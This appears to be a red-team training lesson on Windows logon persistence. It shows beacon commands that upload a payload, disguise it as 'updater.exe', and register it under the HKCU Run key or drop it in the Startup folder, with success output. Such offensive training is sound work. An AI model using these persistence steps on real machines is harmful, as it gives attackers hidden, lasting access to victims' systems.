Boot or Logon Autostart Execution is a collection of techniques [[T1547](https://attack.mitre.org/techniques/T1547/)] where an adversary configures the computer to automatically execute a payload during startup, or when a user logs in.

## Registry Run Keys

The Windows Registry contains multiple keys that allow programs to run when a user logs in.  These are used legitimately to start some default Windows applications, or 3rd party applications that the user has installed.  The two common user keys are:

- HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    
- HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
    

The **Run** key is persistent and remains across every reboot of the system; whereas the **RunOnce** key gets automatically deleted after its first run.  To leverage the key, simply write a new value containing the path to a program to run.  The syntax of the `reg_set` command is `reg_set <host:optional> <hive> <key> <value> <type> <data>`.

```powershell
beacon> cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe

beacon> reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_EXPAND_SZ %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe
Setting registry key \\.\0000000080000001\Software\Microsoft\Windows\CurrentVersion\Run\Updater with type 1
Successfully set regkey
SUCCESS.
```

Read it back with `reg_query` to make sure it was added correctly.
```powershell
beacon> reg_query HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater

  01/07/2025 11:51:52 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    Updater                REG_EXPAND_SZ          %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe
```

> Use `reg_delete` to remove a registry key or value when it's no longer required.

## Startup Folder

Programs in the user's startup folder will also run automatically on login.  The location of this folder is `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`.  Simply upload an executable into this directory and it will run each time the user logs in.

```powershell
beacon> cd C:\Users\pchilds\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe
```

> Delete the file when the persistence is no longer required.